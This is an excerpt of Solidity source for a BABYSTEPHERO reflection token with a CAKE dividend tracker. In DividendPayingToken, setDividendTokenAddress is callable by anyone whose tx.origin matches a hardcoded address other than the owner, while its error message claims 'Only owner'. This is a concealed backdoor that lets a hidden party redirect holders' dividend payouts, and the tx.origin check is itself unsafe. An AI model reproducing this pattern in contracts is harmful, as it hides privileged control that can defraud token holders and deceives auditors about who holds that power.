...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0x78F776F1874612706F84A24574483f0D05Be1718, "Only owner can change dividend contract address");
...
contract BABYSTEPHERO is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("BABY STEPHERO", "BABYSTEPHERO") {
    	cakeDividendTracker = new CakeDividendTracker();


    	marketingWallet = 0xF2d80c1f5dbaDCF69Be01FD4AB9EDC6459DECc5f;
    ...
    function updateCakeDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(cakeDividendTracker), "BABYSTEPHERO: The dividend tracker already has that address");

        CakeDividendTracker newCakeDividendTracker = CakeDividendTracker(payable(newAddress));

        require(newCakeDividendTracker.owner() == address(this), "BABYSTEPHERO: The new dividend tracker must be owned by the BABYSTEPHERO token contract");
...
contract CakeDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("BABYSTEPHERO_Dividend_Tracker", "BABYSTEPHERO_Dividend_Tracker", 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82) {
    	claimWait = 1200;
        minimumTokenBalanceForDividends = 500000 * (10**18); //must hold 500,000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "BABYSTEPHERO_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "BABYSTEPHERO_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main EtherBack contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 1200 && newClaimWait <= 86400, "BABYSTEPHERO_Dividend_Tracker: claimWait" );
        require(newClaimWait != claimWait, "BABYSTEPHERO_Dividend_Tracker: Cannot update claimWait to same value");
